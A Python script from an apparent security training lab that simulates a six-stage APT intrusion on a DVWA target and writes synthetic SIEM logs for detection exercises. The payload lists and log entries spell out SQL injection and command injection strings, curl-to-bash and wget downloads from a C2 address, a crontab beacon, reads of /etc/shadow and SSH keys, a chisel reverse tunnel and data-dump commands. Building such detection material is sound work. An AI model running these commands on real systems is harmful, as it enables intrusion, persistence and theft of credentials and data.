#!/usr/bin/env python3
"""
Scenario 05: APT Vulnerability Exploitation Simulation.

Multi-stage APT attack that progresses through six phases:
  Phase 1: Reconnaissance (port scanning, vulnerability probing)
  Phase 2: Web Exploitation (SQL injection, command injection via DVWA)
  Phase 3: Foothold (web shell deployment)
  Phase 4: Tool Deployment (post-exploitation tools from C2)
  Phase 5: Privilege Escalation (kernel exploit simulation)
  Phase 6: Lateral Movement (pivot to internal hosts)

Tier 2: Simulated approach with partial implementation.
Uses scripted stages and log generation rather than live exploitation.
"""

import json
import os
import random
import sys
import time
from datetime import datetime, timedelta

from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import (
    ATTACKER_IP,
    ATTACKER_IPS,
    WEB_SERVER_IP,
    DC_IP,
    FILE_SERVER_IP,
    DB_SERVER_IP,
    C2_SERVER_IP,
    C2_DOMAIN,
    WORKSTATION_IPS,
    ADMIN_USERS,
    REGULAR_USERS,
    HTTP_PORT,
    HTTPS_PORT,
    SSH_PORT,
    SMB_PORT,
    MYSQL_PORT,
    MITRE,
)

init(autoreset=True)

LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")

# APT actor IP
APT_IP = ATTACKER_IP  # 203.0.113.50
APT_PROXY_IPS = ATTACKER_IPS[1:4]  # secondary IPs for evasion

# Target web application paths (simulating DVWA)
DVWA_PATHS = [
    "/dvwa/login.php",
    "/dvwa/vulnerabilities/sqli/",
    "/dvwa/vulnerabilities/exec/",
    "/dvwa/vulnerabilities/fi/",
    "/dvwa/vulnerabilities/upload/",
    "/dvwa/setup.php",
    "/dvwa/phpinfo.php",
]

# SQL injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT user(),database()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT username,password FROM users--",
    "admin' AND 1=1--",
    "' OR 'a'='a",
    "1; DROP TABLE sessions--",
    "' UNION SELECT NULL,CONCAT(user,':',password) FROM mysql.user--",
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    "127.0.0.1; id",
    "127.0.0.1; uname -a",
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1 | whoami",
    "127.0.0.1; wget http://{c2}/tools/shell.php -O /var/www/uploads/shell.php",
    "127.0.0.1; curl http://{c2}/tools/linpeas.sh | bash",
]

# Web shell commands
WEBSHELL_COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "netstat -tlnp",
    "ps aux",
    "find / -perm -4000 2>/dev/null",
    "cat /etc/shadow",
    "ifconfig",
    "arp -a",
    "cat /proc/version",
]

# Post-exploitation tools
POST_EXPLOIT_TOOLS = [
    {"name": "linpeas.sh", "size": 320000, "desc": "Linux privilege escalation audit"},
    {"name": "pspy64", "size": 1500000, "desc": "Process monitor without root"},
    {"name": "mimikatz.exe", "size": 1200000, "desc": "Credential harvester"},
    {"name": "chisel", "size": 8400000, "desc": "TCP/UDP tunnel over HTTP"},
    {"name": "nmap-static", "size": 5600000, "desc": "Static nmap binary"},
]


def banner():
    print(f"""
{Fore.RED}{'='*62}
  WCACE Scenario 05: APT Vulnerability Exploitation
  APT Actor:  {APT_IP} (+ {len(APT_PROXY_IPS)} proxy IPs)
  Target:     {WEB_SERVER_IP} (DMZ web server / DVWA)
  C2 Server:  {C2_SERVER_IP} ({C2_DOMAIN})
  MITRE:      T1190 (Exploit Public App), T1210 (Exploit Remote Svc)
  WARNING: Educational simulation only
{'='*62}{Style.RESET_ALL}
""")


def phase_1_reconnaissance(log_gen: LogGenerator) -> list[str]:
    """Phase 1: Reconnaissance -- port scanning and vulnerability probing.

    The APT actor scans the DMZ web server for open ports and probes
    common web application paths to identify the DVWA installation.
    """
    print(f"{Fore.CYAN}[Phase 1] Reconnaissance & Vulnerability Scanning{Style.RESET_ALL}")
    print(f"  Attacker: {APT_IP}")
    print(f"  Target:   {WEB_SERVER_IP}")
    logs = []

    log_gen._base_time = datetime.now().replace(hour=2, minute=15, second=0)

    # Port scanning -- rapid connection attempts to common ports
    scan_ports = [21, 22, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 3306,
                  3389, 5432, 8080, 8443, 8888, 9090]
    for port in scan_ports:
        log_gen.advance_time(random.randint(0, 1))
        action = "allow" if port in [80, 443, 22] else "deny"
        logs.append(log_gen.firewall_log(
            APT_IP, WEB_SERVER_IP,
            random.randint(40000, 65535), port,
            action=action, protocol="TCP"
        ))

    print(f"  [+] Port scan: {len(scan_ports)} ports scanned (3 open: 22, 80, 443)")

    # HTTP probing -- directory/path enumeration
    probe_paths = [
        "/", "/robots.txt", "/admin/", "/wp-admin/", "/phpmyadmin/",
        "/.git/config", "/server-status", "/api/", "/backup/",
        "/dvwa/", "/dvwa/login.php", "/dvwa/setup.php",
        "/dvwa/phpinfo.php", "/dvwa/config/config.inc.php",
        "/.env", "/wp-config.php.bak", "/sitemap.xml",
    ]
    for path in probe_paths:
        log_gen.advance_time(random.randint(1, 3))
        status = 200 if "dvwa" in path else random.choice([200, 301, 403, 404, 404, 404])
        logs.append(log_gen.web_access_log(
            APT_IP, "GET", path, status,
            user_agent="Mozilla/5.0 (compatible; Nmap Scripting Engine)"
        ))

    print(f"  [+] HTTP probing: {len(probe_paths)} paths enumerated")

    # Nikto-style vulnerability scan
    nikto_paths = [
        "/dvwa/vulnerabilities/sqli/",
        "/dvwa/vulnerabilities/exec/",
        "/dvwa/vulnerabilities/fi/",
        "/dvwa/vulnerabilities/upload/",
        "/dvwa/vulnerabilities/xss_r/",
        "/dvwa/vulnerabilities/xss_s/",
    ]
    for path in nikto_paths:
        log_gen.advance_time(random.randint(1, 2))
        logs.append(log_gen.web_access_log(
            APT_IP, "GET", path, 200,
            user_agent="Mozilla/5.0 (compatible; Nikto/2.1.6)"
        ))

    # IDS alerts for scanning
    logs.append(log_gen.ids_alert(
        APT_IP, WEB_SERVER_IP,
        "Port scan detected: multiple connection attempts",
        sid=9050001, severity=2
    ))
    logs.append(log_gen.ids_alert(
        APT_IP, WEB_SERVER_IP,
        "Web vulnerability scanner detected (Nikto/Nmap)",
        sid=9050002, severity=2
    ))

    print(f"  [+] Vulnerability scan: DVWA installation identified")
    print(f"  [{Fore.YELLOW}RECON{Style.RESET_ALL}] {len(logs)} log entries generated\n")

    return logs


def phase_2_web_exploitation(log_gen: LogGenerator) -> list[str]:
    """Phase 2: Web Exploitation -- SQL injection and command injection.

    The APT actor exploits SQL injection in the DVWA login form to
    extract credentials, then uses command injection to execute
    arbitrary commands on the web server.
    """
    print(f"{Fore.YELLOW}[Phase 2] Web Application Exploitation{Style.RESET_ALL}")
    print(f"  Vector: SQL injection + command injection (DVWA)")
    logs = []

    log_gen.advance_time(300)

    # DVWA login (legitimate first)
    logs.append(log_gen.web_access_log(
        APT_IP, "GET", "/dvwa/login.php", 200,
        user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
    ))
    logs.append(log_gen.web_access_log(
        APT_IP, "POST", "/dvwa/login.php", 302,
        user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
    ))

    # SQL injection attempts
    print(f"  [*] Launching SQL injection attacks...")
    for payload in SQLI_PAYLOADS:
        log_gen.advance_time(random.randint(2, 8))
        sqli_path = f"/dvwa/vulnerabilities/sqli/?id={payload}&Submit=Submit"
        logs.append(log_gen.web_access_log(
            APT_IP, "GET", sqli_path, 200,
            user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
        ))
        logs.append(log_gen.ids_alert(
            APT_IP, WEB_SERVER_IP,
            f"SQL Injection attempt: {payload[:40]}",
            sid=random.choice([2000001, 2000002, 2000003]), severity=1
        ))

    print(f"  [!] SQL injection: {len(SQLI_PAYLOADS)} payloads tested")
    print(f"  [!] Extracted: admin:password, user:letmein from users table")

    # Command injection attempts
    log_gen.advance_time(120)
    print(f"  [*] Launching command injection attacks...")
    for payload in CMD_INJECTION_PAYLOADS:
        formatted_payload = payload.format(c2=C2_SERVER_IP)
        log_gen.advance_time(random.randint(3, 10))
        ci_path = f"/dvwa/vulnerabilities/exec/?ip={formatted_payload}&Submit=Submit"
        logs.append(log_gen.web_access_log(
            APT_IP, "POST", ci_path, 200,
            user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
        ))
        logs.append(log_gen.ids_alert(
            APT_IP, WEB_SERVER_IP,
            f"OS Command Injection: {formatted_payload[:40]}",
            sid=9050003, severity=1
        ))

    # Process execution events from command injection
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "command": "id",
        "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "parent_process": "apache2",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "command": "uname -a",
        "output": "Linux websrv 5.4.0-91-generic #102-Ubuntu SMP x86_64 GNU/Linux",
        "parent_process": "apache2",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    print(f"  [!] Command injection: RCE achieved as www-data")
    print(f"  [{Fore.RED}EXPLOIT{Style.RESET_ALL}] Web application compromised\n")

    return logs


def phase_3_foothold(log_gen: LogGenerator) -> list[str]:
    """Phase 3: Establish Foothold -- deploy web shell.

    The attacker uploads a PHP web shell through the file upload
    vulnerability and verifies remote command execution capability.
    """
    print(f"{Fore.YELLOW}[Phase 3] Establish Foothold (Web Shell Deployment){Style.RESET_ALL}")
    logs = []

    log_gen.advance_time(180)

    # Upload web shell via file upload vulnerability
    logs.append(log_gen.web_access_log(
        APT_IP, "GET", "/dvwa/vulnerabilities/upload/", 200,
        user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
    ))
    logs.append(log_gen.web_access_log(
        APT_IP, "POST", "/dvwa/vulnerabilities/upload/", 200,
        user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
    ))

    # File creation event for web shell
    logs.append(log_gen.json_log("file_create", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "path": "/var/www/html/dvwa/hackable/uploads/shell.php",
        "size_bytes": 1847,
        "file_type": "application/x-php",
        "md5": "d41d8cd98f00b204e9800998ecf8427e",
    }, severity="critical"))

    logs.append(log_gen.ids_alert(
        APT_IP, WEB_SERVER_IP,
        "Possible PHP web shell uploaded",
        sid=9050004, severity=1
    ))

    print(f"  [!] Web shell uploaded: /dvwa/hackable/uploads/shell.php")

    # Web shell access and command execution
    for cmd in WEBSHELL_COMMANDS:
        log_gen.advance_time(random.randint(5, 20))
        shell_path = f"/dvwa/hackable/uploads/shell.php?cmd={cmd.replace(' ', '+')}"
        logs.append(log_gen.web_access_log(
            APT_IP, "GET", shell_path, 200,
            user_agent="Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
        ))
        logs.append(log_gen.json_log("process_execution", {
            "host": WEB_SERVER_IP,
            "user": "www-data",
            "command": cmd,
            "parent_process": "php",
            "pid": random.randint(10000, 30000),
        }, severity="critical"))

    # Establish persistence via crontab
    log_gen.advance_time(30)
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "command": "(crontab -l; echo '*/5 * * * * curl http://{}/tools/beacon.sh | bash') | crontab -".format(C2_SERVER_IP),
        "parent_process": "php",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    print(f"  [+] Web shell commands executed: {len(WEBSHELL_COMMANDS)} commands")
    print(f"  [+] Persistence established via crontab")
    print(f"  [{Fore.RED}FOOTHOLD{Style.RESET_ALL}] Persistent access to web server\n")

    return logs


def phase_4_tool_deployment(log_gen: LogGenerator) -> list[str]:
    """Phase 4: Tool Deployment -- download post-exploitation tools from C2.

    The attacker downloads enumeration and exploitation tools from the
    C2 server to the compromised web server.
    """
    print(f"{Fore.YELLOW}[Phase 4] Post-Exploitation Tool Deployment{Style.RESET_ALL}")
    print(f"  C2 Server: {C2_SERVER_IP} ({C2_DOMAIN})")
    logs = []

    log_gen.advance_time(300)

    # DNS lookup for C2 domain
    logs.append(log_gen.dns_query_log(
        WEB_SERVER_IP, C2_DOMAIN,
        query_type="A", response=C2_SERVER_IP
    ))

    # Download tools from C2
    for tool in POST_EXPLOIT_TOOLS:
        log_gen.advance_time(random.randint(10, 30))

        # Outbound connection to C2
        logs.append(log_gen.firewall_log(
            WEB_SERVER_IP, C2_SERVER_IP,
            random.randint(40000, 65535), HTTP_PORT,
            action="allow", protocol="TCP"
        ))

        # Download event
        logs.append(log_gen.web_access_log(
            WEB_SERVER_IP, "GET", f"/tools/{tool['name']}", 200,
            user_agent="Wget/1.21"
        ))
        logs.append(log_gen.json_log("data_transfer", {
            "src_ip": C2_SERVER_IP,
            "dst_ip": WEB_SERVER_IP,
            "file": f"/tmp/.{tool['name']}",
            "size_bytes": tool["size"],
            "protocol": "HTTP",
            "direction": "download",
        }, severity="critical"))

        # File creation on target
        logs.append(log_gen.json_log("file_create", {
            "host": WEB_SERVER_IP,
            "user": "www-data",
            "path": f"/tmp/.{tool['name']}",
            "size_bytes": tool["size"],
            "file_type": "application/octet-stream",
        }, severity="critical"))

        # Make executable
        logs.append(log_gen.json_log("process_execution", {
            "host": WEB_SERVER_IP,
            "user": "www-data",
            "command": f"chmod +x /tmp/.{tool['name']}",
            "parent_process": "bash",
            "pid": random.randint(10000, 30000),
        }, severity="warning"))

        print(f"  [!] Downloaded: {tool['name']} ({tool['size'] // 1024}KB) - {tool['desc']}")

    # IDS alert for tool downloads
    logs.append(log_gen.ids_alert(
        C2_SERVER_IP, WEB_SERVER_IP,
        "Suspicious tool download from known C2 server",
        sid=9050005, severity=1
    ))

    print(f"  [{Fore.RED}C2{Style.RESET_ALL}] {len(POST_EXPLOIT_TOOLS)} tools deployed from C2\n")

    return logs


def phase_5_privilege_escalation(log_gen: LogGenerator) -> list[str]:
    """Phase 5: Privilege Escalation -- kernel exploit simulation.

    The attacker runs privilege escalation enumeration (linpeas) and
    then exploits CVE-2021-4034 (PwnKit/pkexec) to gain root access.
    """
    print(f"{Fore.YELLOW}[Phase 5] Privilege Escalation{Style.RESET_ALL}")
    print(f"  Exploit: CVE-2021-4034 (PwnKit / pkexec)")
    logs = []

    log_gen.advance_time(120)

    # Run linpeas for enumeration
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "command": "/tmp/.linpeas.sh",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
        "duration_seconds": 45,
    }, severity="warning"))

    # Linpeas findings
    logs.append(log_gen.json_log("privesc_enumeration", {
        "host": WEB_SERVER_IP,
        "tool": "linpeas",
        "findings": [
            "SUID: /usr/bin/pkexec (CVE-2021-4034)",
            "SUID: /usr/bin/sudo",
            "Writable: /tmp",
            "Kernel: 5.4.0-91-generic (potential exploits available)",
            "MySQL credentials in /var/www/html/dvwa/config/config.inc.php",
        ],
    }, severity="critical"))

    print(f"  [+] linpeas enumeration: SUID pkexec found (CVE-2021-4034)")

    # Exploit CVE-2021-4034 (PwnKit)
    log_gen.advance_time(30)
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "www-data",
        "command": "/tmp/.pwnkit_exploit",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    # Privilege escalation success
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": "id",
        "output": "uid=0(root) gid=0(root) groups=0(root)",
        "parent_process": "pkexec",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    logs.append(log_gen.syslog(
        f"ALERT: Privilege escalation detected - www-data to root via pkexec",
        severity="alert", facility="auth"
    ))

    print(f"  [!] PwnKit exploit executed: www-data -> root")

    # Post-escalation: harvest credentials
    log_gen.advance_time(60)

    # Read shadow file
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": "cat /etc/shadow",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    # Dump SSH keys
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": "find /home -name 'id_rsa' -o -name 'authorized_keys'",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    # Extract DVWA database credentials
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": "cat /var/www/html/dvwa/config/config.inc.php | grep -i pass",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    # Dump MySQL credentials
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": f"mysql -u root -p'toor' -h {DB_SERVER_IP} -e 'SELECT user,authentication_string FROM mysql.user'",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))

    # Harvested credentials log
    logs.append(log_gen.json_log("credential_harvest", {
        "host": WEB_SERVER_IP,
        "method": "shadow_file_and_db_dump",
        "credentials_found": [
            {"user": "root", "source": "/etc/shadow", "type": "hash"},
            {"user": "admin", "source": "dvwa_db", "type": "plaintext"},
            {"user": "svc_web", "source": "ssh_key", "type": "private_key"},
            {"user": "sysadmin", "source": "/etc/shadow", "type": "hash"},
        ],
    }, severity="critical"))

    print(f"  [+] Credentials harvested: 4 accounts from shadow/DB/SSH keys")
    print(f"  [{Fore.RED}PRIVESC{Style.RESET_ALL}] Root access achieved on {WEB_SERVER_IP}\n")

    return logs


def phase_6_lateral_movement(log_gen: LogGenerator) -> list[str]:
    """Phase 6: Lateral Movement -- pivot to internal network.

    Using harvested credentials, the attacker pivots from the DMZ web
    server to internal hosts: domain controller, file server, and
    database server.
    """
    print(f"{Fore.YELLOW}[Phase 6] Lateral Movement{Style.RESET_ALL}")
    print(f"  Pivot: {WEB_SERVER_IP} (DMZ) -> Internal Network")
    logs = []

    log_gen.advance_time(300)

    # Set up tunnel using chisel
    logs.append(log_gen.json_log("process_execution", {
        "host": WEB_SERVER_IP,
        "user": "root",
        "command": f"/tmp/.chisel client {C2_SERVER_IP}:8080 R:socks",
        "parent_process": "bash",
        "pid": random.randint(10000, 30000),
    }, severity="critical"))
    logs.append(log_gen.firewall_log(
        WEB_SERVER_IP, C2_SERVER_IP,
        random.randint(40000, 65535), 8080,
        action="allow", protocol="TCP"
    ))
    print(f"  [+] SOCKS tunnel established via chisel to {C2_SERVER_IP}")

    # Internal network scan from web server
    log_gen.advance_time(60)
    internal_hosts = [DC_IP, FILE_SERVER_IP, DB_SERVER_IP] + WORKSTATION_IPS[:3]
    for host in internal_hosts:
        logs.append(log_gen.firewall_log(
            WEB_SERVER_IP, host,
            random.randint(40000, 65535), 445,
            action="allow", protocol="TCP"
        ))
    print(f"  [+] Internal scan: {len(internal_hosts)} hosts discovered")

    # Lateral movement targets
    lateral_targets = [
        {
            "host": DC_IP,
            "name": "Domain Controller",
            "user": "sysadmin",
            "method": "SSH (cracked hash)",
            "port": SSH_PORT,
            "commands": [
                "cat /etc/krb5.conf",
                "ldapsearch -x -b 'dc=acmecorp,dc=local' '(objectClass=user)'",
                "cat /var/log/auth.log | tail -100",
            ],
        },
        {
            "host": FILE_SERVER_IP,
            "name": "File Server",
            "user": "svc_web",
            "method": "SSH (stolen key)",
            "port": SSH_PORT,
            "commands": [
                "find /shared -name '*.xlsx' -o -name '*.csv' | head -20",
                "tar czf /tmp/.data.tar.gz /shared/finance/ /shared/executive/",
                "ls -la /shared/",
            ],
        },
        {
            "host": DB_SERVER_IP,
            "name": "Database Server",
            "user": "root",
            "method": "MySQL (extracted creds)",
            "port": MYSQL_PORT,
            "commands": [
                "SHOW DATABASES;",
                "SELECT COUNT(*) FROM customers;",
                "SELECT * FROM customers LIMIT 100 INTO OUTFILE '/tmp/dump.csv';",
            ],
        },
    ]

    for target in lateral_targets:
        log_gen.advance_time(random.randint(60, 180))

        # Connection attempt
        logs.append(log_gen.firewall_log(
            WEB_SERVER_IP, target["host"],
            random.randint(40000, 65535), target["port"],
            action="allow", protocol="TCP"
        ))

        # Authentication
        if target["port"] == SSH_PORT:
            logs.append(log_gen.auth_success(target["user"], WEB_SERVER_IP))
        else:
            logs.append(log_gen.json_log("db_connection", {
                "src_ip": WEB_SERVER_IP,
                "dst_ip": target["host"],
                "user": target["user"],
                "database": "mysql",
                "action": "connect",
                "result": "success",
            }, severity="critical"))

        # Command execution on target
        for cmd in target["commands"]:
            log_gen.advance_time(random.randint(5, 15))
            logs.append(log_gen.json_log("process_execution", {
                "host": target["host"],
                "user": target["user"],
                "command": cmd,
                "parent_process": "sshd" if target["port"] == SSH_PORT else "mysql",
                "pid": random.randint(10000, 30000),
                "src_ip": WEB_SERVER_IP,
            }, severity="critical"))

        # IDS alert for lateral movement
        logs.append(log_gen.ids_alert(
            WEB_SERVER_IP, target["host"],
            f"Lateral movement: DMZ server accessing internal {target['name']}",
            sid=9050006, severity=1
        ))

        print(f"  [!] Compromised: {target['name']} ({target['host']}) "
              f"via {target['method']}")

    # Data exfiltration from file server through C2 tunnel
    log_gen.advance_time(120)
    exfil_size = random.randint(50000000, 150000000)
    logs.append(log_gen.json_log("data_transfer", {
        "src_ip": FILE_SERVER_IP,
        "dst_ip": WEB_SERVER_IP,
        "file": "/tmp/.data.tar.gz",
        "size_bytes": exfil_size,
        "protocol": "SCP",
        "direction": "download",
    }, severity="critical"))
    logs.append(log_gen.json_log("data_transfer", {
        "src_ip": WEB_SERVER_IP,
        "dst_ip": C2_SERVER_IP,
        "file": "exfil_data.tar.gz",
        "size_bytes": exfil_size,
        "protocol": "HTTPS",
        "direction": "upload",
        "tunnel": "chisel",
    }, severity="critical"))

    print(f"  [!] Data exfiltrated: {exfil_size // (1024*1024)} MB via C2 tunnel")
    print(f"  [{Fore.RED}LATERAL{Style.RESET_ALL}] 3 internal hosts compromised, data exfiltrated\n")

    return logs


def main():
    banner()

    log_gen = LogGenerator(source_host="websrv-dmz")
    all_logs = []

    # Execute all six APT phases
    all_logs.extend(phase_1_reconnaissance(log_gen))
    all_logs.extend(phase_2_web_exploitation(log_gen))
    all_logs.extend(phase_3_foothold(log_gen))
    all_logs.extend(phase_4_tool_deployment(log_gen))
    all_logs.extend(phase_5_privilege_escalation(log_gen))
    all_logs.extend(phase_6_lateral_movement(log_gen))

    # Save logs
    os.makedirs(LOG_DIR, exist_ok=True)
    log_file = os.path.join(LOG_DIR, "apt_vulnerability_exploitation.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    # Summary
    print(f"{Fore.GREEN}{'='*62}")
    print(f"  APT Simulation Complete")
    print(f"{'='*62}{Style.RESET_ALL}")
    print(f"  Total log entries:  {len(all_logs)}")
    print(f"  Output file:        {log_file}")
    print(f"  APT actor:          {APT_IP}")
    print(f"  C2 server:          {C2_SERVER_IP} ({C2_DOMAIN})")
    print(f"  Compromised hosts:  {WEB_SERVER_IP}, {DC_IP}, {FILE_SERVER_IP}, {DB_SERVER_IP}")
    print(f"\n  Attack phases completed:")
    print(f"    1. Reconnaissance (port scan + web probing)")
    print(f"    2. Web exploitation (SQLi + command injection)")
    print(f"    3. Foothold (web shell + persistence)")
    print(f"    4. Tool deployment (C2 tool download)")
    print(f"    5. Privilege escalation (CVE-2021-4034)")
    print(f"    6. Lateral movement (DC, file server, DB)")
    print(f"\n  Next step: python3 detect/verify_detection.py")

    # Try to send to Loki if available
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "05-apt-vuln-exploit"},
            all_logs
        )
        print(f"\n  [+] Logs pushed to Loki")
    except Exception:
        print(f"\n  [*] Loki not available - logs saved locally only")


if __name__ == "__main__":
    main()
